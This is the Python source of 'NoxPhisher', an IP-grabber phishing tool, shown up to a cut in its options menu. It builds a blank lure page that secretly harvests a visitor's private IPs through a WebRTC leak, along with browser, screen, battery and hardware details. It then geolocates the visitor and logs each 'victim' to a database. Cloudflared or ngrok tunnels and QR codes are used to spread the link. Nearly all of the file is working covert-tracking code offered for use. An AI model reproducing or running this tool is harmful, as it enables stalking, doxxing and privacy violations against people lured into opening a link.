import os
import sys
import time
import json
import subprocess
import shutil
import platform
import requests
import threading
import ipaddress
import argparse
import sqlite3
import datetime
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

# Intentar importar plyer, si falla no hay problema (Termux/iSH)
try:
    from plyer import notification
    HAS_NOTIFY = True
except ImportError:
    HAS_NOTIFY = False

# Intentar importar colorama, si no, instanciar clases dummy para evitar crashes
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class DummyColor:
        def __getattr__(self, name): return ""
    Fore = DummyColor()
    Style = DummyColor()

# ─── Variables Globales de Configuración ────────────────────────────
CONFIG = {
    "port": 8080,
    "dedup_window": 60,
    "redirect_url": "https://www.google.com",
    "tunnel_choice": 1,  # 1: Cloudflared, 2: Ngrok, 3: Localhost
    "generate_qr": True,
    "ngrok_token": ""
}

GRABBER_OPTIONS = {
    "ip_public": True,      # Siempre true desde server
    "ip_private": True,     # WebRTC
    "geolocation": True,    # Desde server
    "user_agent": True,     # Headers
    "screen_platform": True,
    "battery": False,
    "connection": False,
    "hardware": False       # RAM / Cores
}

# ─── Utilidades UI ──────────────────────────────────────────────────

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo():
    logo = """
    ███╗   ██╗ ██████╗ ██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ████╗  ██║██╔═══██╗╚██╗██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
    ██╔██╗ ██║██║   ██║ ╚███╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
    ██║╚██╗██║██║   ██║ ██╔██╗ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
    ██║ ╚████║╚██████╔╝██╔╝ ██╗██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    
    # Efecto degradado simple (Magenta -> Cyan)
    lines = logo.strip('\n').split('\n')
    for i, line in enumerate(lines):
        if i < 2:
            print(Fore.MAGENTA + line + Style.RESET_ALL)
        elif i < 4:
            print(Fore.BLUE + line + Style.RESET_ALL)
        else:
            print(Fore.CYAN + line + Style.RESET_ALL)
        time.sleep(0.05)
        
    print(f"    {Fore.GREEN}by nostraxiten | github.com/nostraxiten{Style.RESET_ALL}")
    print(f"    {Fore.YELLOW}v2.0 - Ultimate Edition{Style.RESET_ALL}\n")

def spinner(text, duration=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{Fore.CYAN}{chars[i % len(chars)]}{Style.RESET_ALL} {text}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{Fore.GREEN}✔{Style.RESET_ALL} {text} - Hecho!{' ' * 10}\n")
    sys.stdout.flush()

def fake_progress(text, steps=10, delay=0.1):
    print(f"{Fore.YELLOW}[*] {text}{Style.RESET_ALL}")
    for i in range(steps + 1):
        percent = int(i * 100 / steps)
        bar = "█" * i + "░" * (steps - i)
        sys.stdout.write(f"\r{Fore.CYAN}[{bar}] {percent}%{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ─── Grabber Core ───────────────────────────────────────────────────

class IPGrabberUltimate:
    def __init__(self, port=8080, dedup_window=60):
        self.port = port
        self.dedup_window = dedup_window
        self.victims = []
        self.seen_ips = {}
        self.total_captures = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.db_path = "captures.db"
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                capture_id    INTEGER,
                ip_public     TEXT,
                ip_version    TEXT,
                ip_private    TEXT,
                ip_private_v6 TEXT,
                country       TEXT,
                region        TEXT,
                city          TEXT,
                lat           REAL,
                lon           REAL,
                isp           TEXT,
                org           TEXT,
                timezone      TEXT,
                asn           TEXT,
                user_agent    TEXT,
                browser       TEXT,
                language      TEXT,
                screen        TEXT,
                platform      TEXT,
                memory        TEXT,
                cores         TEXT,
                timestamp     INTEGER,
                datetime      TEXT,
                battery       TEXT,
                connection    TEXT
            )
        ''')
        # Migraciones silenciosas
        try: c.execute("ALTER TABLE captures ADD COLUMN battery TEXT")
        except sqlite3.OperationalError: pass
        try: c.execute("ALTER TABLE captures ADD COLUMN connection TEXT")
        except sqlite3.OperationalError: pass
        conn.commit()
        conn.close()

    def save_to_db(self, data):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            INSERT INTO captures (
                capture_id, ip_public, ip_version, ip_private, ip_private_v6,
                country, region, city, lat, lon, isp, org, timezone, asn,
                user_agent, browser, language, screen, platform, memory, cores,
                timestamp, datetime, battery, connection
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('capture_id', 0), data.get('ip_public', ''), data.get('ip_version', ''),
            data.get('ip_private', ''), data.get('ip_private_v6', ''),
            data.get('country', ''), data.get('region', ''), data.get('city', ''),
            data.get('lat', 0), data.get('lon', 0), data.get('isp', ''), data.get('org', ''),
            data.get('timezone', ''), data.get('as', ''),
            data.get('user_agent', ''), data.get('browser', ''), data.get('language', ''),
            data.get('screen', ''), data.get('platform', ''), data.get('memory', ''), data.get('cores', ''),
            data.get('timestamp', 0), data.get('datetime', ''), data.get('battery', 'N/A'), data.get('connection', 'N/A')
        ))
        conn.commit()
        conn.close()

    def get_captures(self, limit=50):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute('SELECT * FROM captures ORDER BY id DESC LIMIT ?', (limit,))
        rows = c.fetchall()
        conn.close()
        return rows

    def get_stats(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM captures')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(DISTINCT ip_public) FROM captures')
        unique = c.fetchone()[0]
        conn.close()
        return total, unique

    def is_duplicate(self, ip, fingerprint):
        with self.lock:
            now = time.time()
            key = f"{ip}_{fingerprint}"

            if key in self.seen_ips:
                timestamps = [t for t in self.seen_ips[key] if now - t < self.dedup_window]
                if timestamps:
                    self.seen_ips[key] = timestamps
                    return True
                else:
                    del self.seen_ips[key]

            self.seen_ips.setdefault(key, []).append(now)
            self.total_captures += 1
            return False

    def cleanup_seen(self):
        now = time.time()
        with self.lock:
            keys_to_delete = [
                key for key, timestamps in self.seen_ips.items()
                if not [t for t in timestamps if now - t < self.dedup_window]
            ]
            for key in keys_to_delete:
                del self.seen_ips[key]

    def get_public_ip(self):
        try:
            r = requests.get('https://api.ipify.org', timeout=5)
            return r.text.strip()
        except:
            try:
                r = requests.get('http://ip-api.com/json/', timeout=5)
                return r.json().get('query', '0.0.0.0')
            except:
                return "0.0.0.0"

    def get_ip_info(self, ip):
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,as",
                timeout=5
            )
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    return {
                        'country':  data.get('country', ''),
                        'region':   data.get('regionName', ''),
                        'city':     data.get('city', ''),
                        'lat':      data.get('lat', 0),
                        'lon':      data.get('lon', 0),
                        'isp':      data.get('isp', ''),
                        'org':      data.get('org', ''),
                        'timezone': data.get('timezone', ''),
                        'as':       data.get('as', '')
                    }
        except:
            pass
        return {}

    def detect_ip_version(self, ip):
        try:
            ipaddress.ip_address(ip)
            return 'IPv6' if ':' in ip else 'IPv4'
        except:
            return 'Unknown'

    def create_web(self):
        os.makedirs("grabber_web", exist_ok=True)
        
        # Generar bloques JS según GRABBER_OPTIONS
        js_webrtc = """
        function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => {
                        pc.setLocalDescription(offer);
                        pc.onicecandidate = (e) => {
                            if (e.candidate) {
                                const m = e.candidate.candidate.match(/([0-9]{1,3}\\\\.){3}[0-9]{1,3}/);
                                if (m) { resolve(m[0]); pc.close(); }
                            }
                        };
                        setTimeout(() => { resolve("unknown"); pc.close(); }, 3000);
                    });
                } catch(e) { resolve("unknown"); }
            });
        }
        function getLocalIPv6() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => {
                        pc.setLocalDescription(offer);
                        pc.onicecandidate = (e) => {
                            if (e.candidate) {
                                const m = e.candidate.candidate.match(/([0-9a-f]{0,4}:){2,7}[0-9a-f]{0,4}/i);
                                if (m) { resolve(m[0]); pc.close(); }
                            }
                        };
                        setTimeout(() => { resolve("unknown"); pc.close(); }, 3000);
                    });
                } catch(e) { resolve("unknown"); }
            });
        }
        """ if GRABBER_OPTIONS['ip_private'] else "function getLocalIP(){return Promise.resolve('unknown');} function getLocalIPv6(){return Promise.resolve('unknown');}"

        js_battery = """
        let batteryInfo = "unknown";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                batteryInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Discharging)");
            } catch(e) {}
        }
        """ if GRABBER_OPTIONS['battery'] else "let batteryInfo = 'unknown';"

        js_connection = """
        let connInfo = "unknown";
        if (navigator.connection) {
            connInfo = navigator.connection.effectiveType || "unknown";
        }
        """ if GRABBER_OPTIONS['connection'] else "let connInfo = 'unknown';"

        js_data_obj = f"""
        const data = {{
            ip_private:    await getLocalIP(),
            ip_private_v6: await getLocalIPv6(),
            user_agent:    navigator.userAgent,
            language:      navigator.language,
            screen:        { 'screen.width + "x" + screen.height' if GRABBER_OPTIONS['screen_platform'] else '"unknown"' },
            timezone:      Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform:      { 'navigator.platform' if GRABBER_OPTIONS['screen_platform'] else '"unknown"' },
            memory:        { 'navigator.deviceMemory || "unknown"' if GRABBER_OPTIONS['hardware'] else '"unknown"' },
            cores:         { 'navigator.hardwareConcurrency || "unknown"' if GRABBER_OPTIONS['hardware'] else '"unknown"' },
            battery:       batteryInfo,
            connection:    connInfo
        }};
        """

        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {{ margin: 0; padding: 0; background-color: #ffffff; }}
        @media (prefers-color-scheme: dark) {{ body {{ background-color: #000000; }} }}
    </style>
</head>
<body>
    <script>
        {js_webrtc}
        async function sendData() {{
            try {{
                {js_battery}
                {js_connection}
                {js_data_obj}

                await fetch("/grab", {{
                    method:  "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body:    JSON.stringify(data)
                }});

                setTimeout(() => {{ window.location.replace("{CONFIG['redirect_url']}"); }}, 500);
            }} catch(e) {{}}
        }}
        sendData();
    </script>
</body>
</html>'''

        with open(os.path.join("grabber_web", "index.html"), "w") as f:
            f.write(html)

class GrabberHandler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def send_ok(self):
        try:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except (BrokenPipeError, ConnectionResetError):
            pass

    def send_error_safe(self, code):
        try:
            self.send_response(code)
            self.end_headers()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            try:
                with open(os.path.join("grabber_web", "index.html"), "r") as f:
                    html = f.read()
                try:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(html.encode())
                except (BrokenPipeError, ConnectionResetError):
                    pass
            except FileNotFoundError:
                self.send_error_safe(500)
        else:
            self.send_error_safe(404)

    def do_POST(self):
        if self.path == '/grab':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = json.loads(post_data)
            except Exception:
                data = {}

            cf_ip = self.headers.get('CF-Connecting-IP')
            if cf_ip:
                ip_public = cf_ip.strip()
            else:
                forwarded = self.headers.get('X-Forwarded-For')
                if forwarded:
                    ip_public = forwarded.split(',')[0].strip()
                else:
                    ip_public = self.client_address[0]

            ip_private    = data.get('ip_private', 'unknown')
            ip_private_v6 = data.get('ip_private_v6', 'unknown')
            ua            = self.headers.get('User-Agent', '')

            fingerprint = f"{ip_private}_{ip_private_v6}_{ua[:50]}_{data.get('language', '')}"

            if self.server.grabber.is_duplicate(ip_public, fingerprint):
                print(f"\n{Fore.YELLOW}[~] {ip_public} ya capturada — ignorando ({self.server.grabber.dedup_window}s){Style.RESET_ALL}")
                self.send_ok()
                return

            ip_version = self.server.grabber.detect_ip_version(ip_public)
            ip_info    = self.server.grabber.get_ip_info(ip_public) if GRABBER_OPTIONS['geolocation'] else {}
            now        = int(time.time())
            dt         = datetime.datetime.fromtimestamp(now).strftime("%Y-%m-%d %H:%M:%S")

            victim_data = {
                'capture_id':    self.server.grabber.total_captures,
                'ip_public':     ip_public,
                'ip_version':    ip_version,
                'ip_private':    ip_private,
                'ip_private_v6': ip_private_v6,
                'country':       ip_info.get('country', ''),
                'region':        ip_info.get('region', ''),
                'city':          ip_info.get('city', ''),
                'lat':           ip_info.get('lat', 0),
                'lon':           ip_info.get('lon', 0),
                'isp':           ip_info.get('isp', ''),
                'org':           ip_info.get('org', ''),
                'timezone':      ip_info.get('timezone', ''),
                'as':            ip_info.get('as', ''),
                'user_agent':    ua,
                'timestamp':     now,
                'datetime':      dt,
                'language':      data.get('language', ''),
                'screen':        data.get('screen', ''),
                'platform':      data.get('platform', ''),
                'memory':        data.get('memory', ''),
                'cores':         data.get('cores', ''),
                'battery':       data.get('battery', ''),
                'connection':    data.get('connection', ''),
                'browser':       self.detect_browser(ua)
            }

            self.server.grabber.victims.append(victim_data)
            self.server.grabber.save_to_db(victim_data)

            if HAS_NOTIFY:
                try:
                    notification.notify(
                        title='NoxPhisher CAPTURA',
                        message=f"IP: {ip_public} — {ip_info.get('city', '?')}",
                        app_name='NoxPhisher',
                        timeout=5
                    )
                except Exception:
                    pass

            # Output terminal
            sep = Fore.CYAN + "=" * 70 + Style.RESET_ALL
            print(f"\n{sep}")
            print(f"{Fore.GREEN}[!] CAPTURA #{self.server.grabber.total_captures} [{dt}]{Style.RESET_ALL}")
            print(sep)
            print(f"  {Fore.MAGENTA}IP Pública:  {Style.RESET_ALL}{ip_public} ({ip_version})")
            if GRABBER_OPTIONS['ip_private']:
                print(f"  {Fore.MAGENTA}IP Privada:  {Style.RESET_ALL}{ip_private}")
                if ip_private_v6 and ip_private_v6 != 'unknown':
                    print(f"  {Fore.MAGENTA}IP Priv v6:  {Style.RESET_ALL}{ip_private_v6}")
            if GRABBER_OPTIONS['geolocation']:
                print(f"  {Fore.CYAN}País:        {Style.RESET_ALL}{ip_info.get('country', '')}")
                print(f"  {Fore.CYAN}Región:      {Style.RESET_ALL}{ip_info.get('region', '')}")
                print(f"  {Fore.CYAN}Ciudad:      {Style.RESET_ALL}{ip_info.get('city', '')}")
                print(f"  {Fore.YELLOW}ISP:         {Style.RESET_ALL}{ip_info.get('isp', '')}")
                print(f"  {Fore.YELLOW}Organización:{Style.RESET_ALL}{ip_info.get('org', '')}")
                print(f"  {Fore.YELLOW}AS:          {Style.RESET_ALL}{ip_info.get('as', '')}")
                if ip_info.get('lat') and ip_info.get('lon'):
                    lat, lon = ip_info['lat'], ip_info['lon']
                    print(f"  {Fore.GREEN}Coordenadas: {Style.RESET_ALL}{lat}, {lon}")
                    print(f"  {Fore.GREEN}Google Maps: {Style.RESET_ALL}https://www.google.com/maps?q={lat},{lon}")
            if GRABBER_OPTIONS['user_agent']:
                print(f"  {Fore.BLUE}User-Agent:  {Style.RESET_ALL}{ua[:80]}...")
                print(f"  {Fore.BLUE}Navegador:   {Style.RESET_ALL}{victim_data['browser']}")
                print(f"  {Fore.BLUE}Idioma:      {Style.RESET_ALL}{data.get('language', '')}")
            if GRABBER_OPTIONS['screen_platform']:
                print(f"  {Fore.BLUE}Pantalla:    {Style.RESET_ALL}{data.get('screen', '')}")
                print(f"  {Fore.BLUE}Plataforma:  {Style.RESET_ALL}{data.get('platform', '')}")
            if GRABBER_OPTIONS['hardware']:
                print(f"  {Fore.BLUE}RAM:         {Style.RESET_ALL}{data.get('memory', '')}GB")
                print(f"  {Fore.BLUE}Núcleos:     {Style.RESET_ALL}{data.get('cores', '')}")
            if GRABBER_OPTIONS['battery'] and data.get('battery') and data.get('battery') != 'unknown':
                print(f"  {Fore.BLUE}Batería:     {Style.RESET_ALL}{data.get('battery', '')}")
            if GRABBER_OPTIONS['connection'] and data.get('connection') and data.get('connection') != 'unknown':
                print(f"  {Fore.BLUE}Conexión:    {Style.RESET_ALL}{data.get('connection', '')}")
            print(sep)

            self.send_ok()
        else:
            self.send_error_safe(404)

    def detect_browser(self, ua):
        u = ua.lower()
        if 'edg' in u:      return 'Edge'
        if 'chrome' in u:   return 'Chrome'
        if 'firefox' in u:  return 'Firefox'
        if 'safari' in u:   return 'Safari'
        if 'opera' in u:    return 'Opera'
        return 'Unknown'

# ─── Tunnel Management ──────────────────────────────────────────────

BIN_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.bin')

def detect_environment():
    if os.environ.get('TERMUX_VERSION') or os.path.isdir('/data/data/com.termux'):
        return 'termux'
    # Detectar iSH (iOS)
    if sys.platform.startswith('linux') and 'ish' in platform.release().lower():
        return 'ish'
    if sys.platform == 'win32':
        return 'windows'
    if sys.platform.startswith('linux'):
        return 'linux'
    if sys.platform == 'darwin':
        return 'macos'
    return 'unknown'

def get_cloudflared_path():
    if sys.platform == 'win32':
        local = os.path.join(BIN_DIR, 'cloudflared.exe')
    else:
        local = os.path.join(BIN_DIR, 'cloudflared')
    if os.path.isfile(local):
        return local
    system_path = shutil.which('cloudflared')
    if system_path:
        return system_path
    return None

def _download_file(url, dest):
    r = requests.get(url, stream=True, timeout=120)
    r.raise_for_status()
    total = int(r.headers.get('content-length', 0))
    downloaded = 0
    with open(dest, 'wb') as f:
        for chunk in r.iter_content(chunk_size=65536):
            f.write(chunk)
            downloaded += len(chunk)
            if total:
                pct = int(downloaded * 100 / total)
                sys.stdout.write(f"\r{Fore.CYAN}    Descargando... {pct}%{Style.RESET_ALL}")
                sys.stdout.flush()
    print()

def ensure_cloudflared():
    if get_cloudflared_path():
        return True

    env = detect_environment()
    os.makedirs(BIN_DIR, exist_ok=True)
    print(f"\n{Fore.YELLOW}[*] Instalando cloudflared para [{env}]...{Style.RESET_ALL}")

    try:
        if env == 'termux':
            subprocess.run(['pkg', 'install', 'cloudflared', '-y'], check=True, timeout=120)
            return bool(shutil.which('cloudflared'))
        
        elif env == 'ish':
            # Alpine linux base for iSH
            print(f"{Fore.RED}[!] iSH requiere instalación manual de cloudflared vía apk si está disponible.{Style.RESET_ALL}")
            return False

        elif env == 'windows':
            arch = platform.machine().lower()
            if arch in ('amd64', 'x86_64'): suffix = 'amd64'
            elif arch == 'arm64': suffix = 'arm64'
            else: suffix = 'amd64'
            url = f'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-{suffix}.exe'
            dest = os.path.join(BIN_DIR, 'cloudflared.exe')
            _download_file(url, dest)
            return True

        elif env == 'linux':
            arch = platform.machine()
            if arch in ('x86_64', 'amd64'): suffix = 'amd64'
            elif arch in ('aarch64', 'arm64'): suffix = 'arm64'
            elif arch.startswith('arm'): suffix = 'arm'
            else: suffix = 'amd64'
            url = f'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{suffix}'
            dest = os.path.join(BIN_DIR, 'cloudflared')
            _download_file(url, dest)
            os.chmod(dest, 0o755)
            return True

        elif env == 'macos':
            arch = platform.machine()
            suffix = 'arm64' if arch == 'arm64' else 'amd64'
            url = f'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-{suffix}.tgz'
            dest_tgz = os.path.join(BIN_DIR, 'cloudflared.tgz')
            _download_file(url, dest_tgz)
            import tarfile
            with tarfile.open(dest_tgz) as tar:
                tar.extractall(BIN_DIR)
            os.remove(dest_tgz)
            os.chmod(os.path.join(BIN_DIR, 'cloudflared'), 0o755)
            return True

    except Exception as e:
        print(f"{Fore.RED}[!] Error instalando cloudflared: {e}{Style.RESET_ALL}")
    return False

def ensure_ngrok():
    env = detect_environment()
    try:
        from pyngrok import ngrok
    except ImportError:
        print(f"{Fore.YELLOW}[*] pyngrok no está instalado. Instalando vía pip...{Style.RESET_ALL}")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pyngrok"], check=True)
            from pyngrok import ngrok
        except Exception as e:
            print(f"{Fore.RED}[!] Error al instalar pyngrok: {e}{Style.RESET_ALL}")
            return False

    try:
        ngrok.install_ngrok()
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error al configurar el binario de ngrok: {e}{Style.RESET_ALL}")
        return False

def parse_tunnel_url(line):
    m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
    return m.group(0) if m else None

def start_cloudflare_tunnel(port=8080):
    cf_path = get_cloudflared_path()
    if not cf_path:
        return None, None
    try:
        cmd  = [cf_path, "tunnel", "--url", f"http://localhost:{port}"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        url  = None
        for _ in range(40):
            line = proc.stdout.readline()
            if line:
                url = parse_tunnel_url(line)
                if url:
                    break
            time.sleep(0.5)
        if url:
            return url, proc
        proc.terminate()
        return None, None
    except Exception:
        return None, None

def start_ngrok_tunnel(port=8080):
    try:
        from pyngrok import ngrok

        if CONFIG['ngrok_token']:
            ngrok.set_auth_token(CONFIG['ngrok_token'])
        else:
            print(f"\n{Fore.RED}[!] No se ha configurado el authtoken de Ngrok.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Regístrate gratis en: https://dashboard.ngrok.com/signup{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Configúralo en: Menú > Configuración > [5] Token Ngrok{Style.RESET_ALL}")
            time.sleep(3)
            return None, None

        tunnel = ngrok.connect(port, "http")
        return tunnel.public_url.replace("http://", "https://"), tunnel
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error iniciando túnel Ngrok: {e}{Style.RESET_ALL}")
        time.sleep(2)
        return None, None

def generate_qr_terminal(url):
    print(f"\n{Fore.CYAN}[*] Generando QR...{Style.RESET_ALL}")
    try:
        result = subprocess.run(
            ['qrencode', '-t', 'ANSI', url],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout:
            print(result.stdout)
            return
    except Exception:
        pass

    try:
        import qrcode
        qr = qrcode.QRCode(version=1, box_size=2, border=1)
        qr.add_data(url)
        qr.make(fit=True)
        out = ""
        for row in qr.get_matrix():
            for cell in row:
                out += "██" if cell else "  "
            out += "\n"
        print(Fore.GREEN + out + Style.RESET_ALL)
    except Exception as e:
        print(f"{Fore.RED}[!] Error generando QR: {e}{Style.RESET_ALL}")

# ─── UI Menús ───────────────────────────────────────────────────────

def menu_header(title, width=56):
    clear_screen()
    print_logo()
    dashes = width - 5 - len(title)
    if dashes < 0:
        dashes = 0
    print(f"{Fore.CYAN}┌─ {title} {'─' * dashes}┐{Style.RESET_ALL}")

def menu_footer(width=56):
    print(f"{Fore.CYAN}└{'─' * (width - 2)}┘{Style.RESET_ALL}")
    return input(f"\n{Fore.GREEN}NoxPhisher > {Style.RESET_ALL}")

def print_row(content_with_colors, visible_len, width=56):
    padding = width - 3 - visible_len
    if padding < 0:
        padding = 0
    print(f"│ {content_with_colors}" + " " * padding + "│")

def config_menu():
    width = 56
    while True:
        menu_header("Configuración", width=width)
        p_val = str(CONFIG['port'])
        line1 = f"[1] Puerto del servidor:  {p_val}"
        print_row(f"{Fore.WHITE}[1]{Style.RESET_ALL} Puerto del servidor:  {Fore.YELLOW}{p_val}{Style.RESET_ALL}", len(line1), width=width)
        
        d_val = str(CONFIG['dedup_window']) + "s"
        line2 = f"[2] Ventana deduplicación: {d_val}"
        print_row(f"{Fore.WHITE}[2]{Style.RESET_ALL} Ventana deduplicación: {Fore.YELLOW}{d_val}{Style.RESET_ALL}", len(line2), width=width)
        
        u_val = str(CONFIG['redirect_url'])
        if len(u_val) > 23:
            u_val_disp = u_val[:20] + "..."
        else:
            u_val_disp = u_val
        line3 = f"[3] URL redirección:      {u_val_disp}"
        print_row(f"{Fore.WHITE}[3]{Style.RESET_ALL} URL redirección:      {Fore.YELLOW}{u_val_disp}{Style.RESET_ALL}", len(line3), width=width)
        
        qr_status = "ON" if CONFIG['generate_qr'] else "OFF"
        line4 = f"[4] Generar QR:           {qr_status}"
        print_row(f"{Fore.WHITE}[4]{Style.RESET_ALL} Generar QR:           {Fore.YELLOW}{qr_status}{Style.RESET_ALL}", len(line4), width=width)
        
        tk_val = CONFIG['ngrok_token'][:15] + "..." if len(CONFIG['ngrok_token']) > 15 else CONFIG['ngrok_token'] or "No configurado"
        line5 = f"[5] Token de Ngrok:       {tk_val}"
        print_row(f"{Fore.WHITE}[5]{Style.RESET_ALL} Token de Ngrok:       {Fore.YELLOW}{tk_val}{Style.RESET_ALL}", len(line5), width=width)
        
        line0 = f"[0] Atrás"
        print_row(f"{Fore.WHITE}[0]{Style.RESET_ALL} Atrás", len(line0), width=width)
        
        opc = menu_footer(width=width)
        if opc == '1':
            try: CONFIG['port'] = int(input(f"{Fore.YELLOW}Nuevo puerto: {Style.RESET_ALL}"))
            except ValueError: pass
        elif opc == '2':
            try: CONFIG['dedup_window'] = int(input(f"{Fore.YELLOW}Segundos para dedup: {Style.RESET_ALL}"))
            except ValueError: pass
        elif opc == '3':
            url = input(f"{Fore.YELLOW}Nueva URL (ej. https://google.com): {Style.RESET_ALL}")
            if url: CONFIG['redirect_url'] = url
        elif opc == '4':
            CONFIG['generate_qr'] = not CONFIG['generate_qr']
        elif opc == '5':
            print(f"\n{Fore.CYAN}Obtén tu token en: https://dashboard.ngrok.com/get-started/your-authtoken{Style.RESET_ALL}")
            token = input(f"{Fore.YELLOW}Authtoken de Ngrok: {Style.RESET_ALL}").strip()
            if token:
                CONFIG['ngrok_token'] = token
                print(f"{Fore.GREEN}[✔] Token configurado correctamente.{Style.RESET_ALL}")
                time.sleep(1)
        elif opc == '0':
            break

def tunnel_menu():
    width = 56
    while True:
        menu_header("Selección de Túnel", width=width)
        t1 = f" {Fore.GREEN}* {Style.RESET_ALL}" if CONFIG['tunnel_choice'] == 1 else "   "
        t2 = f" {Fore.GREEN}* {Style.RESET_ALL}" if CONFIG['tunnel_choice'] == 2 else "   "
        t3 = f" {Fore.GREEN}* {Style.RESET_ALL}" if CONFIG['tunnel_choice'] == 3 else "   "
        
        t1_vis = " * " if CONFIG['tunnel_choice'] == 1 else "   "
        line1 = f"{t1_vis}[1] Cloudflared (Recomendado)"
        print_row(f"{t1}{Fore.WHITE}[1]{Style.RESET_ALL} Cloudflared (Recomendado)", len(line1), width=width)
        
        t2_vis = " * " if CONFIG['tunnel_choice'] == 2 else "   "
        line2 = f"{t2_vis}[2] Ngrok"
        print_row(f"{t2}{Fore.WHITE}[2]{Style.RESET_ALL} Ngrok", len(line2), width=width)
        
        t3_vis = " * " if CONFIG['tunnel_choice'] == 3 else "   "
        line3 = f"{t3_vis}[3] Localhost Only"
        print_row(f"{t3}{Fore.WHITE}[3]{Style.RESET_ALL} Localhost Only", len(line3), width=width)
        
        line0 = f"   [0] Atrás"
        print_row(f"   {Fore.WHITE}[0]{Style.RESET_ALL} Atrás", len(line0), width=width)
        
        opc = menu_footer(width=width)
        if opc in ['1', '2', '3']:
            CONFIG['tunnel_choice'] = int(opc)
            break
        elif opc == '0':
            break

def grabber_options_menu():
    keys = list(GRABBER_OPTIONS.keys())
    labels = {
        "ip_public": "IP Pública (Siempre ACTIVO)",
        "ip_private": "IP Privada (WebRTC)",
        "geolocation": "Geolocalización",
        "user_agent": "User-Agent / Navegador",
        "screen_platform": "Pantalla / OS",
        "battery": "Estado Batería",
        "connection": "Tipo Conexión",
        "hardware": "RAM / Núcleos"
    }
    
    width = 56
    while True:
        menu_header("Opciones del Grabber", width=width)
        line_title = "Usa un número o ENTER para continuar"
        print_row(f"{Fore.CYAN}Usa un número o ENTER para continuar{Style.RESET_ALL}", len(line_title), width=width)
        print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
        
        for i, key in enumerate(keys):
            num = i + 1
            status = f"{Fore.GREEN}[X]{Style.RESET_ALL}" if GRABBER_OPTIONS[key] else f"{Fore.RED}[ ]{Style.RESET_ALL}"
            status_vis = "[X]" if GRABBER_OPTIONS[key] else "[ ]"
            if key == "ip_public": 
                status = f"{Fore.GREEN}[-]{Style.RESET_ALL}" # Fijo
                status_vis = "[-]"
            line_item = f"[{num}] {status_vis} {labels[key]}"
            print_row(f"{Fore.WHITE}[{num}]{Style.RESET_ALL} {status} {labels[key]}", len(line_item), width=width)
        
        print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
        line0 = "[0] Volver al menú principal"
        print_row(f"{Fore.WHITE}[0]{Style.RESET_ALL} Volver al menú principal", len(line0), width=width)
        lineE = "[ENTER] Iniciar Grabber"
        print_row(f"{Fore.GREEN}[ENTER]{Style.RESET_ALL} Iniciar Grabber", len(lineE), width=width)
        
        opc = menu_footer(width=width)
